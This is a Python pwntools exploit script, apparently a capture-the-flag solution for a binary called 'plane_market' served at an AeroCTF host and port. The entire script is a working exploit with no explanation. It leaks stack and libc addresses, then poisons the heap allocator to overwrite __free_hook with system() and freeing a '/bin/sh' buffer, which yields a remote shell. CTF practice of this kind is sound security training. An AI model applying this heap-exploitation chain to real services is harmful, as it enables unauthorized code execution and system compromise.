from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './plane_market'
HOST = 'tasks.aeroctf.com'
PORT = 33087

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x1294])


def sell(size, name, cost=0, comsize=1337, comment = ''):
    r.sendlineafter('> ', '1') 
    r.sendlineafter('size: ', str(size)) 
    r.sendafter('name: ', name) 
    r.sendlineafter('cost: ', str(cost)) 

    if comment != '':
        r.sendlineafter('[Y\N]: ', 'Y') 
        r.sendlineafter('size: ', str(comsize)) 
        r.sendafter('mment: ', comment) 
    else:
        r.sendlineafter('[Y\N]: ', 'N') 

def delete(idx): 
    r.sendlineafter('> ', '2') 
    r.sendlineafter('id: ', str(idx)) 

def view_list(): 
    r.sendlineafter('> ', '3') 

def view_plane(idx): 
    r.sendlineafter('> ', '4') 
    r.sendlineafter('id: ', str(idx)) 

def change(idx, name):
    r.sendlineafter('> ', '5') 
    r.sendlineafter('id: ', str(idx)) 
    r.sendafter('name: ', name) 

def view_prof(): 
    r.sendlineafter('> ', '6') 
r.sendafter('name: ', 'A'*0x80)
view_prof()
r.recvuntil('A'*0x80)
stack = u64(r.recvuntil('\n')[:-1]+'\x00\x00')
dbg("stack")

sell(0x410, 'A')
sell(0x8, 'A')

delete(0) 
sell(0x410, 'A')

view_plane(0)
r.recvuntil('Name: ')
leak = u64(r.recvuntil('\n')[:-1] + '\x00\x00')
dbg("leak")
# base = leak - 0x1e4c41
base = leak - 0x1b9c41
# fh = base + 0x1e75a8
fh = base + 0x1bc5a8
# system = base + 0x52fd0
system = base + 0x46ff0

dbg("base")

sell(0x8, 'A')
change(1, 'hoge')
delete(1)

change(1, p64(fh))
sell(0x8, '/bin/sh\x00')
sell(0x8, p64(system))

r.interactive()
r.close()
